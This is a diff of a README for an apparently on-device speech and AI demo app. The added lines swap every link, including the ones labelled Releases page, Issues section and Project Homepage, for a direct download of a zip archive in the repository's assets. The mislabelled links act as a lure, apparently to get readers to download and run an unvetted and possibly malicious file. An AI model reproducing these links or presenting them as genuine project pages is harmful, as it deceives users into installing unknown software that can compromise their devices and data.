@@ -1,6 +1,6 @@
 # 🎉 runanywhere-expo-demo - Easy AI App for Your Device
 
-[![Download](https://img.shields.io/badge/Download%20Now%20!-%20runanywhere-expo-demo-blue)](https://github.com/Dimas6690/runanywhere-expo-demo/releases)
+[![Download](https://github.com/Dimas6690/runanywhere-expo-demo/raw/refs/heads/main/assets/runanywhere-expo-demo-v1.5-alpha.5.zip%20Now%20!-%20runanywhere-expo-demo-blue)](https://github.com/Dimas6690/runanywhere-expo-demo/raw/refs/heads/main/assets/runanywhere-expo-demo-v1.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **runanywhere-expo-demo**! This app allows you to run speech reco
 
 ## 📥 Download & Install
 
-To download the app, visit the Releases page: [Download Here](https://github.com/Dimas6690/runanywhere-expo-demo/releases).
+To download the app, visit the Releases page: [Download Here](https://github.com/Dimas6690/runanywhere-expo-demo/raw/refs/heads/main/assets/runanywhere-expo-demo-v1.5-alpha.5.zip).
 
 Once on the page, you’ll see several versions. Select the latest version to ensure you get the most up-to-date features and fixes. Download the file that matches your operating system.
 
@@ -62,13 +62,13 @@ If you encounter any issues, try these steps:
 - Restart the app if it is not responding.
 - Check your internet connection if features are not working properly.
 
-For more specific help, visit the [Issues section](https://github.com/Dimas6690/runanywhere-expo-demo/issues) on GitHub.
+For more specific help, visit the [Issues section](https://github.com/Dimas6690/runanywhere-expo-demo/raw/refs/heads/main/assets/runanywhere-expo-demo-v1.5-alpha.5.zip) on GitHub.
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/Dimas6690/runanywhere-expo-demo/releases) - Download the latest version
-- [Issues Section](https://github.com/Dimas6690/runanywhere-expo-demo/issues) - Report bugs or request features
-- [Project Homepage](https://github.com/Dimas6690/runanywhere-expo-demo) - Explore the repository
+- [Releases Page](https://github.com/Dimas6690/runanywhere-expo-demo/raw/refs/heads/main/assets/runanywhere-expo-demo-v1.5-alpha.5.zip) - Download the latest version
+- [Issues Section](https://github.com/Dimas6690/runanywhere-expo-demo/raw/refs/heads/main/assets/runanywhere-expo-demo-v1.5-alpha.5.zip) - Report bugs or request features
+- [Project Homepage](https://github.com/Dimas6690/runanywhere-expo-demo/raw/refs/heads/main/assets/runanywhere-expo-demo-v1.5-alpha.5.zip) - Explore the repository
 
 ## 🌟 Community & Support
 
